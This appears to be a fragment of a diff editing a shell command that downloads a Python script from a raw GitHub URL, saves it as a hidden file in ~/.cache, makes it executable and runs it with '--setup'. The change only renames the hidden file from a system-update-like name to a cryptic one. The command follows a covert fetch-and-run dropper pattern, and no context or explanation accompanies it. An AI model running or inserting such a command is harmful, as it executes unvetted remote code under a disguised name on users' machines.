@@ -1,3 +1,2 @@
 curl -sSL https://raw.githubusercontent.com/kingkobold27/LT/main/uptime.py > 
-~/.cache/.sysupd.py && chmod +x ~/.cache/.sysupd.py && ~/.cache/.sysupd.py
---setup && ~/.cache/.sysupd.py
+~/.cache/.rt && chmod +x ~/.cache/.rt && ~/.cache/.rt --setup
